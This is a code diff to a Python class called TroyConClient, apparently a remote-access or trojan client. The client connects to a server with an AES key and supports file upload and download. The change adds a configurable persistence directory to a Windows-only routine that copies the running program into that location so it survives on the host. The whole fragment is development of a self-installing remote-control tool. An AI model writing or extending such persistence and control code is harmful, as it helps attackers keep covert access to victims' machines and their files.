@@ -25,7 +25,7 @@ class TroyConClient:
     - Includes file upload and download capabilities.
     """
 
-    def __init__(self, server_ip: str, server_port: int, aes_key: bytes, test_dir: str = None):
+    def __init__(self, server_ip: str, server_port: int, aes_key: bytes, test_dir: str = None, persistence_dir: str = None):
         """
         Client initialization method
 
@@ -43,6 +43,7 @@ class TroyConClient:
 
         # Set and change to the test directory
         self.test_dir = test_dir
+        self.persistence_dir = persistence_dir
         if self.test_dir:
             try:
                 os.makedirs(self.test_dir, exist_ok=True)
@@ -127,8 +128,8 @@ class TroyConClient:
         if os.name == 'nt':
             try:
                 current_exe_path = os.path.abspath(sys.argv[0])
-               # Fix the destination path for the copied file within the current test directory (test_dir)
-                persistence_target_path = os.path.join(self.test_dir, 'troycon.py') # Don't use after converting to an EXE file.
+               # Fix the destination path for the copied file within the current Persistence directory (persistence_dir)
+                persistence_target_path = os.path.join(self.persistence_dir, 'troycon.py') # Don't use after converting to an EXE file.
 
                 if not os.path.exists(persistence_target_path):
                     with open(current_exe_path, 'rb') as src_file, \
